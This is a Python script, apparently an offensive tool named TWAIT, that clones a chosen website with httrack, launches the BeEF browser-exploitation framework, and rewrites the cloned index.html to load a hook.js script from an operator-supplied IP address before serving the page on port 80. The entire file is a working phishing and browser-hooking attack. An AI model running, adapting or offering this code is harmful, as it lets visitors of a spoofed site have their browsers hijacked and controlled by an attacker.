#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#Metadata
__author__ = "SherlockSec";
__version__ = "1.0";
__license__ = "GPL-3.0";
#Imports
import sys, os, subprocess, fileinput, http.server, socketserver
from subprocess import check_output;
#Declarations
possible_packages = [
    "httrack",
    "beef-xss",
];

class colour_header:
    green = "\x1b[1;32;40m"
    red = "\x1b[1;31;40m"
    white = "\x1b[0m"
    purple = "\x1b[1;35;40m"

ascii_art = '''
  _______        __    ___ _____
 |_   _\ \      / /_ _|_ _|_   _|
   | |  \ \ /\ / / _` || |  | |
   | |   \ V  V / (_| || |  | |
   |_|    \_/\_/ \__,_|___| |_|
'''

args = '''
Arguments:

-h : Help
-u : URL
-r : Use a previous clone
-o : Output folder
-p : BeEF Hook IP Address
-c : Check dependencies
-i : Install dependencies
'''
#Functions
def DependencyCheck(possible_packages):
    for x in possible_packages:
        p = subprocess.Popen(["dpkg", "-s", x], stdout=subprocess.PIPE, stderr=subprocess.PIPE); #Runs the debian command to check if a package is installed
        out, err = p.communicate() #Output the result to either out (good result) or err (bad result)
        out, err = str(out), str(err) #String conversion
        if "install ok installed" in out: #If command returns true
            print("%sPackage - %s - is installed.%s" % (colour_header.green, x, colour_header.white));
        else: #If command returns false
            print("%sPackage - %s - is not installed.%s" % (colour_header.red, x, colour_header.white));

def ArgCheck(arg):
    for x in range(0, len(sys.argv)): #For every item in the arguments
        y = sys.argv[x]; #The argument text
        if y == arg: #If the argument is the same as the expected
            return x; #Return the position of the argument
    return False; #Else, return False

def execute(cmd):
    popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
    for stdout_line in iter(popen.stdout.readline, ""):
        yield stdout_line
    popen.stdout.close()
    return_code = popen.wait()
    if return_code:
        raise subprocess.CalledProcessError(return_code, cmd)

def WebsiteClone(url, folder): #httrack usage - 'httrack <URL> -O <FOLDER>'
    for path in execute(["httrack", url, "-O", folder]):
        print(path, end="");

def BeEFStart():
    for path in execute(["sudo", "beef-xss"]):
        print(path, end="");

def fileInject(hookIP, url, outputFolder):
    beefString = ("http://%s:3000/hook.js" % hookIP)
    if "https://" in url:
        cutDownUrl = url.replace("https://", "");
    elif "http://" in url:
        cutDownUrl = url.replace("http://", "");
    global webFilepath;
    webFilepath = ("%s/%s/" % (outputFolder, cutDownUrl))
    filepath = ("%s/%s/index.html" % (outputFolder, cutDownUrl));
    file = open(filepath, "r");
    filedata = file.read();
    file.close()
    filedata = filedata.replace("<head>", "<head>\n<script src='%s'></script>" % beefString)
    file = open(filepath, "w");
    file.write(filedata);
    file.close()

def httpHost():
    port = 80;
    os.chdir(webFilepath)

    Handler = http.server.SimpleHTTPRequestHandler;
    httpd = socketserver.TCPServer(("", port), Handler);
    try:
        httpd.serve_forever();
    except KeyboardInterrupt:
        pass;
        httpd.server_close();




#Check Arguments
if len(sys.argv) == 1:
    print("%s%s%s%s" % (colour_header.purple, ascii_art, colour_header.white, args)); #Print ascii_art in Purple, followed by available args.
    print("%sError: no arguments given%s" % (colour_header.red, colour_header.white));
    sys.exit();
elif os.geteuid() != 0:
    print("%sThis script requires root privilleges. Please append 'sudo' to the beinning of your command.%s" % (colour_header.red, colour_header.white)); #Throw error
    sys.exit();
elif "-h" in sys.argv:
        print("%s%s%s%s" % (colour_header.purple, ascii_art, colour_header.white, args)); #Print ascii_art in Purple, followed by available args.
elif "-c" in sys.argv:
    DependencyCheck(possible_packages); #Check dependencies
elif "-u" in sys.argv:
    pos = ArgCheck("-u") #Position of -u
    pos += 1 #Position of the url
    url = sys.argv[pos] #Declare the url
    if "-o" in sys.argv:
        if "-p" in sys.argv:
            ipOut = ArgCheck("-p");
            ipOut += 1;
            localIP = sys.argv[ipOut];
            posOut = ArgCheck("-o");
            posOut += 1;
            outputFolder = sys.argv[posOut];
            WebsiteClone(url, outputFolder);
            print("\nFinished Cloning");
            print("\nNow starting beef-xss.");
            BeEFStart();
            print("\nInjecting the BeEF hook")
            fileInject(localIP, url, outputFolder);
            print("\nStarting the http server")
            httpHost();
        elif "-p" not in sys.argv:
            #Local IP for beef-xss error
            print("%sError: no BeEF Hook IP Address specified%s" % (colour_header.red, colour_header.white));
        elif "-o" not in sys.argv:
            print("%sError: no output path specified%s" % (colour_header.red, colour_header.white)); #Throw error
elif "-u" not in sys.argv:
    if "-r" in sys.argv:
        if "-o" in sys.argv:
            if "-p" in sys.argv:
                ipOut = ArgCheck("-p");
                ipOut += 1;
                localIP = sys.argv[ipOut];
                posOut = ArgCheck("-o");
                posOut += 1;
                outputFolder = sys.argv[posOut];
                print("\nNow starting beef-xss.");
                BeEFStart();
                print("\nStarting the http server")
                httpHost();
            elif "-p" not in sys.argv:
                #Local IP for beef-xss error
                print("%sError: no BeEF Hook IP Address specified%s" % (colour_header.red, colour_header.white));
            elif "-o" not in sys.argv:
                print("%sError: no output path specified%s" % (colour_header.red, colour_header.white)); #Throw error
    else:
        print("%sError: no site specified%s" % (colour_header.red, colour_header.white)); #Throw error
